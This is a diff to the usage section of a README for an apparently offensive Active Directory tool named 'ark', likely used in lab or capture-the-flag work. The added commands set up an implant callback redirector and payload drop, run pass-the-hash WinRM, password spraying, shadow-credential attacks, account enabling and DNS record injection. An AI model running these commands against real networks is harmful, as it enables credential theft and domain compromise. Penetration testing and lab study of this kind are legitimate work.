@@ -38,11 +38,25 @@ bash scripts/smoke_test.sh
 
 # Host-side (no implant)
 ./build/ark inbound status
+./build/ark inbound redirector start --listen 0.0.0.0:1750 --to 127.0.0.1:8443
+./build/ark inbound httpdrop --callback https://<tun0>:1750 --dir /tmp/www --listen 0.0.0.0:1723
+./build/ark op replay-clear <implant_id>
+./build/ark winrm --host H --user U --domain D --hash-file nt.txt --ps "whoami"
+# winrm/mssql need the repo (scripts/). From ~/.local/bin: export ARK_ROOT=/path/to/ARK
+eval "$(ark inbound env --port 1080)"
+./build/ark mssql query --host INNER_SQL_IP --user U --pass-file p --windows --sql "SELECT 1"
+./build/ark ad shadow auto --dc DC --domain D --user U --hash NT --target SAM --out t.pfx --yes
 ./build/ark ldap enum --dc DC --domain DOM --user u --pass-file p --type interesting
+./build/ark ldap enum --dc DC --domain DOM --user u --pass-file p --type acl --sam m.carter
+./build/ark ldap enable --dc DC --domain DOM --user u --pass-file p --target m.carter --yes
+./build/ark ldap spray --dc DC --domain DOM --user-file users.txt --pass-file p --delay 2s --yes
 ./build/ark ldap dangling --dc DC --domain DOM --user u --pass-file p
+./build/ark http get --url https://DC/ --user u --pass-file p --domain DOM --insecure
+./build/ark dns add --dc DC --domain DOM --user u --pass-file p --name testdns --type A --data 10.10.14.1 --yes
 ./build/ark adcs dangling --dc DC --domain DOM --user u --pass-file p
 ./build/ark rbcd show --dc DC --domain DOM --user u --pass-file p --to HOST$
 ./build/ark smb shares --host DC --anon
+./build/ark smb ls --host DC_IP --hostname dc.dom.htb --share SYSVOL --ticket ID
 ./build/ark ad password --dc DC --domain DOM --user u --pass-file p --target t --new-pass-file n
 ```
 
